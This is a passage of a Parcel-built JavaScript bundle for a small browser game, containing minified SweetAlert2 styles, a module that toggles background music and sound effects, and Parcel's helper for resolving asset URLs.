.swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}');

},{}],"8t3va":[function() {},{}],"7Hlpd":[function(require,module,exports) {
"use strict";
exports.__esModule = true;
exports.sounds = void 0;
var refs_1 = require("./refs");
var musicBtn = refs_1.refs.musicBtn, soundBtn = refs_1.refs.soundBtn;
exports.sounds = {
    stepSound: new Audio(require("url:../sounds/step.wav")),
    backgroundSound: new Audio(require("url:../sounds/bcg.wav")),
    lostSound: new Audio(require("url:../sounds/lost.wav")),
    victorySound: new Audio(require("url:../sounds/victory.wav")),
    takenSound: new Audio(require("url:../sounds/taken.wav"))
};
musicBtn === null || musicBtn === void 0 || musicBtn.addEventListener("click", toggleMusic);
soundBtn === null || soundBtn === void 0 || soundBtn.addEventListener("click", toggleSounds);
exports.sounds.backgroundSound.muted = true;
exports.sounds.backgroundSound.loop = true;
function toggleMusic() {
    exports.sounds.backgroundSound.muted = !exports.sounds.backgroundSound.muted;
    if (!exports.sounds.backgroundSound.muted) {
        exports.sounds.backgroundSound.play();
        exports.sounds.backgroundSound.addEventListener("timeupdate", function() {
            var buffer = 0.5;
            if (exports.sounds.backgroundSound.currentTime > exports.sounds.backgroundSound.duration - buffer) setTimeout(function() {
                exports.sounds.backgroundSound.currentTime = 0;
                exports.sounds.backgroundSound.play();
            }, 0.27);
        });
    }
    musicBtn === null || musicBtn === void 0 || musicBtn.classList.toggle("musicOff");
}
function toggleSounds() {
    exports.sounds.stepSound.muted = !exports.sounds.stepSound.muted;
    exports.sounds.lostSound.muted = !exports.sounds.lostSound.muted;
    exports.sounds.victorySound.muted = !exports.sounds.victorySound.muted;
    exports.sounds.takenSound.muted = !exports.sounds.takenSound.muted;
    soundBtn === null || soundBtn === void 0 || soundBtn.classList.toggle("musicOff");
}

},{"./refs":"jHtzO","url:../sounds/step.wav":"f8nme","url:../sounds/bcg.wav":"ksIJt","url:../sounds/lost.wav":"8sQyi","url:../sounds/victory.wav":"4bnaS","url:../sounds/taken.wav":"ldNy3"}],"f8nme":[function(require,module,exports) {
module.exports = require("./helpers/bundle-url").getBundleURL("bLxZJ") + "step.db8de405.wav" + "?" + Date.now();

},{"./helpers/bundle-url":"lgJ39"}],"lgJ39":[function(require,module,exports) {
"use strict";
var bundleURL = {};
function getBundleURLCached(id) {
    var value = bundleURL[id];
    if (!value) {
        value = getBundleURL();
        bundleURL[id] = value;
    }
    return value;
}
function getBundleURL() {
    try {
        throw new Error();
    } catch (err) {
        var matches = ("" + err.stack).match(/(https?|file|ftp|(chrome|moz|safari-web)-extension):\/\/[^)\n]+/g);
        if (matches) // The first two stack frames will be this function and getBundleURLCached.
        // Use the 3rd one, which will be a runtime in the original bundle.
        return getBaseURL(matches[2]);
    }
    return "/";
}
function getBaseURL(url) {
    return ("" + url).replace(/^((?:https?|file|ftp|(chrome|moz|safari-web)-extension):\/\/.+)\/[^/]+$/, "$1") + "/";
} // TODO: Replace uses with `new URL(url).origin` when ie11 is no longer supported.
function getOrigin(url) {
    var matches = ("" + url).match(/(https?|file|ftp|(chrome|moz|safari-web)-extension):\/\/[^/]+/);
    if (!matches) throw new Error("Origin not found");
    return matches[0];
}
exports.getBundleURL = getBundleURLCached;
exports.getBaseURL = getBaseURL;
exports.getOrigin = getOrigin;

},{}],"ksIJt":[function(require,module,exports) {
module.exports = require("./helpers/bundle-url").getBundleURL("bLxZJ") + "bcg.8e706975.wav" + "?" + Date.now();

},{"./helpers/bundle-url":"lgJ39"}],"8sQyi":[function(require,module,exports) {
module.exports = require("./helpers/bundle-url").getBundleURL("bLxZJ") + "lost.47236084.wav" + "?" + Date.now();

},{"./helpers/bundle-url":"lgJ39"}],"4bnaS":[function(require,module,exports) {
module.exports = require("./helpers/bundle-url").getBundleURL("bLxZJ") + "victory.7e67708e.wav" + "?" + Date.now();

},{"./helpers/bundle-url":"lgJ39"}],"ldNy3":[function(require,module,exports) {
module.exports = require("./helpers/bundle-url").getBundleURL("bLxZJ") + "taken.ef24690b.wav" + "?" + Date.now();

},{"./helpers/bundle-url":"lgJ39"}]},["ShInH","8lqZg"], "8lqZg", "parcelRequire1ecf")

//# sourceMappingURL=index.975ef6c8.js.map
